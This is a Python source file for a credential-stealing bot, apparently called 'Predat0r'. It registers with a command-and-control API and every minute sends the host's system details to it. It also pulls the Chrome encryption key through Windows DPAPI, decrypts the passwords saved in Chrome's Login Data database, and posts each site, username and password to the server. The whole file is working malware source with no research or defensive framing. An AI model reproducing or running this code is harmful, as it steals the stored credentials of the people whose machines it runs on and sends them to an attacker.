import os
import platform
import psutil
from datetime import datetime
import time
import requests
import base64
import schedule
import json
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES

APP_DATA = os.environ['LOCALAPPDATA']
API_URL = "http://localhost:4000"
CONFIG_PATH = "config.txt"

class b64():
    def encrypt(self, text):
        return base64.b64encode(text.encode('utf-8')).decode('utf-8')

    def decrypt(self, text):
        return base64.b64decode(text.encode('utf-8')).decode('utf-8')

class ApiController():
    def __init__(self):
        self.api_url = API_URL
    
    def check_connection(self):
        try:
            r = requests.get(self.api_url)
            if r.status_code == 200:
                return True
            else:
                return False
        except:
            return False
        
    def check_account(self, identifier, token):
        r = requests.get(f"{self.api_url}/bots/check/{identifier}/{token}")
        if r.status_code == 200:
            return True
        else:
            return False

    def register_account(self):
        r = requests.post(f"{self.api_url}/bots/register")
        if r.status_code == 200:
            return [r.json()["identifier"], r.json()["token"]]
        else:
            return False

    def update_details(self, identifier, token):
        if self.check_connection():
            uname = platform.uname()

            boot_time_timestamp = psutil.boot_time()
            bt = datetime.fromtimestamp(boot_time_timestamp)

            post_data = {
                "token" : token,
                "operating_system": uname.system,
                "node_name": uname.node,
                "release": uname.release,
                "version": uname.version,
                "processor": uname.processor,
                "architecture": uname.machine,
                "boot_time": f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}",
                "cpu_cores": psutil.cpu_count(logical=True),
                "memory": psutil.virtual_memory().total
            }

            requests.post(f"{self.api_url}/update/details/{identifier}", json=post_data)

    def update_chrome(self, identifier, token, data):
        if self.check_connection():
            for d in data:
                post_data = {
                    "token": token,
                    "identifier": identifier,
                    "host": d["host"],
                    "user": d["user"],
                    "password": d["pass"]
                }

                requests.post(f"{self.api_url}/update/chrome/{identifier}", json=post_data)

class FileController():
    def __init__(self):
        self.config_path = CONFIG_PATH

    def check_file(self, filename):
        if os.path.isfile(filename):
            return True
        else:
            return False

    def delete_file(self, filename):
        os.remove(filename)

    def save_creds(self, identifier, token):
        f = open(self.config_path, 'w+')
        f.write(f'{identifier}:{token}')
        f.close()

    def get_creds(self):
        f = open(self.config_path, 'r').read()
        if ":" in f:
            l = f.split(":")
            return [l[0], l[1]]
        else:
            return False

class Chrome(object):
    def __init__(self):
        self.stored = []
        self.lad = os.environ["LOCALAPPDATA"]
        self.temp = os.environ["APPDATA"] + "Predat0r"

    def chrome_key(self):
        with open(os.path.join(self.lad, "Google\\Chrome\\User Data\\Local State"), encoding="utf-8") as k:
            ck = json.loads(k.read())
        return win32crypt.CryptUnprotectData(
            base64.b64decode(ck["os_crypt"]["encrypted_key"])[5:],
            None,
            None,
            None,
            0)[1]

    def locate_db(self):
        full_path = os.path.join(APP_DATA, 'Google\\Chrome\\User Data\\Default\\Login Data')
        temp_path = os.path.join(APP_DATA, 'sqlite_file')
        if os.path.exists(temp_path): 
            os.remove(temp_path)
        shutil.copyfile(full_path, temp_path)
        return full_path

    def decrypt_pass(self, cont):
        try:
            iv = cont[3:15]
            data = cont[15:]
            ciph = AES.new(self.chrome_key(), AES.MODE_GCM, iv)
            decrypted = ciph.decrypt(data)
            decrypted = decrypted[:-16].decode()
            return decrypted
        except:
            decrypted = win32crypt.CryptUnprotectData(cont, None, None, None, 0)
            return decrypted[1]

    def dump(self):
        try:
            db = self.locate_db()
            db2 = shutil.copy(db, APP_DATA)
            conn = sqlite3.connect(db2)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value  from logins")
            for item in cursor.fetchall():
                if item[0] != "":
                    self.stored.append({"host": item[0], "user": item[1], "pass": self.decrypt_pass(item[2])})
        except:
            pass
        return self.stored

def main():
    api = ApiController()
    fsc = FileController()

    if api.check_connection():
        if fsc.check_file(CONFIG_PATH):
            bot_data = fsc.get_creds()
        
            if bot_data and isinstance(bot_data, list):
                try:
                    bot_identifier = b64().decrypt(bot_data[0])
                    bot_token = b64().decrypt(bot_data[1])
                except:
                    os.remove(CONFIG_PATH)
                    bot_data = api.register_account()
                    fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                    main()
                
                if api.check_account(bot_identifier, bot_token):
                    schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
                    schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
                    while True:
                        schedule.run_pending()
                        time.sleep(1)
                else:
                    os.remove(CONFIG_PATH)
                    bot_data = api.register_account()
                    fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                    main()

            else:
                os.remove(CONFIG_PATH)
                bot_data = api.register_account()
                fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                main()
        else:
            bot_data = api.register_account()
            fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
            main()
    else:
        time.sleep(30)
        main()

if __name__ == "__main__":
    main()